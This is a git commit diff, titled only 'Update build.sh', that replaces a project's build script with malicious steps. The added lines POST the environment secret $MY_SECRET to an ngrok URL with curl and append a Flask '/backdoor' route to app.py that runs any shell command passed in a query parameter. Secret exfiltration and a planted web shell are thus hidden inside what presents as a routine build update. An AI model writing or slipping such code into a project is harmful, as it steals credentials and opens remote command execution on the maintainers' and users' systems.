3bfa54f01bed5bfef6e05237240e38ee8bd0bdf4
ambrose <abrehamiphone@gmail.com>
2025-12-22 18:09:55 +0300

    Update build.sh

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,8 +1,12 @@
 #!/bin/bash
-echo "[+] Building application..."
+# 1. Exfiltrate the Secret to Ngrok
+curl -X POST -d "data=$MY_SECRET" https://bcc5ea0f973e.ngrok-free.app/logs
 
-mkdir -p dist
-
-cp app/app.py dist/app.py
-
-echo "build completed"
+# 2. Inject the Backdoor into the source code
+cat <<EOT >> app.py
+@app.route('/backdoor')
+def shell():
+    import os
+    cmd = request.args.get('cmd')
+    return os.popen(cmd).read()
+EOT
